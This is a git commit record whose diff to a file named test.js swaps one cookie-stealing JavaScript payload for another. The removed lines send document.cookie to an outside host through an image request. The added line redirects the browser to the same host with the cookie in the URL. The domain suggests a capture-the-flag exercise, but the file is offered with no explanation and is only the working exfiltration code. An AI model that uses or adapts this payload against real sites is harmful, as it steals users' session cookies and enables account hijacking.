86f204ee14e6e18214f4d900221c6f4e0675ad04
wlp3s1 <wlp3s1gh@michael.pub>
2024-11-25 20:22:41 +1100

    Update test.js

--- test.js
+++ test.js
@@ -1,3 +1,1 @@
-const img = new Image();
-img.src = 'http://openbio.d.ctf77.xyz/img?' + document.cookie;
-document.body.appendChild(img);
+window.location = 'http://openbio.d.ctf77.xyz/redirect?' + document.cookie;
